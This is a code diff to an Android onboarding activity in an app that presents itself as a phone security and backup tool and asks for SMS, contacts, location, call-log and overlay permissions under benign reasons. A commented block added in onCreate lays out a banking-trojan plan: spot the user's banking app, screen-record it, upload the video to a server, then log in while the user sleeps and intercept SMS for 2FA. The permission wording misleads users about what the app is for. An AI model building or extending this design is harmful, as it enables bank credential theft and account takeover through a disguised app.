@@ -4,8 +4,12 @@ package com.example.jeanniesecure;
 import android.Manifest;
 import android.content.Context;
 import android.content.DialogInterface;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.media.Image;
+import android.net.Uri;
+import android.os.Build;
+import android.provider.Settings;
 import android.support.annotation.NonNull;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
@@ -40,7 +44,7 @@ public class MainActivity extends AppCompatActivity {
             "The GPS Location service in Phone Sage need permission",
             "We need this permission to read and write data when download file / backup or restore contacts and sms",
             "We need this permission to backup and restore contacts",
-            "We need this permission when receive a call",
+            /*"We need this permission when receive a call",*/
             "We need this permission to backup and restore sms and send phone location to safe phone number",
             "We need this permission to read call log or intercept call",
     };
@@ -49,7 +53,7 @@ public class MainActivity extends AppCompatActivity {
             Manifest.permission.ACCESS_FINE_LOCATION,
             Manifest.permission.READ_EXTERNAL_STORAGE,
             Manifest.permission.READ_CONTACTS,
-            Manifest.permission.SYSTEM_ALERT_WINDOW,
+            /*Manifest.permission.SYSTEM_ALERT_WINDOW,*/
             Manifest.permission.READ_SMS,
             Manifest.permission.READ_PHONE_STATE,
     };
@@ -58,7 +62,7 @@ public class MainActivity extends AppCompatActivity {
             1,
             1,
             1,
-            1,
+            /*5469,*/
             1,
             1,
     };
@@ -67,6 +71,22 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+
+/*
+        if (1) {
+            //GO MAIN APPLICATION
+            //INITIALIZING SCREEN -> Threading/Services
+        }
+        else{
+            //ON BOARDING SCREEN
+            //INITIALIZING SCREEN -> Threading/Services
+            //Thread package name (Find out which iBanking app user use)
+            //Poll when use users one of iBanking app, ps -A  -> Screen record -> Store external storage
+            //Detect wifi connection -> Send video to server
+            //Only when video sent, wait for user inactive(Sleeping) -> open iBanking app, enter X,Y coordinates to login
+            //Intecept SMS for 2FA, then login success
+        }*/
 
         mSlideViewPager = (ViewPager) findViewById(R.id.slideViewPager);
         mDotLayout = (LinearLayout) findViewById(R.id.dotsLayer);
@@ -84,9 +104,27 @@ public class MainActivity extends AppCompatActivity {
         mNextBtn.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view){
-                if (ContextCompat.checkSelfPermission( MainActivity.this,
-                        permissions[mCurrentPage]) == PackageManager.PERMISSION_GRANTED){
-                    mSlideViewPager.setCurrentItem(mCurrentPage+1);
+                /*Log.d("permission code", Integer.toString(permissions_code[mCurrentPage]));
+                if (mCurrentPage == 3) {
+                    if (permissions_code[mCurrentPage] == 5469){
+                        if (!Settings.canDrawOverlays(MainActivity.this)) {
+                            // You don't have permission
+                            checkPermission();
+
+                        } else {
+                            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
+                            startActivityForResult(intent, permissions_code[mCurrentPage]);
+                            Log.d("here","here");
+                        }
+                    }
+                } else*/ if (ContextCompat.checkSelfPermission( MainActivity.this,permissions[mCurrentPage]) == PackageManager.PERMISSION_GRANTED){
+                    if (mCurrentPage != permissions.length-1){
+                        mSlideViewPager.setCurrentItem(mCurrentPage+1);
+                    }
+                    else{
+                        Intent intent = new Intent(getApplicationContext(), Initialising.class);
+                        startActivity(intent);
+                    }
                 } else {
                     requestStoragePermission(mCurrentPage);
                 }
@@ -100,6 +138,15 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
+    }
+
+    public void checkPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (!Settings.canDrawOverlays(this)) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, permissions_code[mCurrentPage]);
+            }
+        }
     }
 
     private void requestStoragePermission(final int position) {
@@ -126,11 +173,17 @@ public class MainActivity extends AppCompatActivity {
     }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissionss, @NonNull int[] grantResults) {
         if(requestCode == permissions_code[mCurrentPage]){
             if(grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                 Toast.makeText(this, "Permission Granted", Toast.LENGTH_SHORT).show();
-                mSlideViewPager.setCurrentItem(mCurrentPage+1);
+                if (mCurrentPage != permissions.length-1){
+                    mSlideViewPager.setCurrentItem(mCurrentPage+1);
+                }
+                else{
+                    Intent intent = new Intent(getApplicationContext(), Initialising.class);
+                    startActivity(intent);
+                }
             } else{
                 Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show();
             }
@@ -139,7 +192,7 @@ public class MainActivity extends AppCompatActivity {
 
 
     public void addDotsIndicator(int position){
-        mDots = new TextView[6];
+        mDots = new TextView[5];
         mDotLayout.removeAllViews();
 
         for(int i = 0 ; i < mDots.length ; i++) {
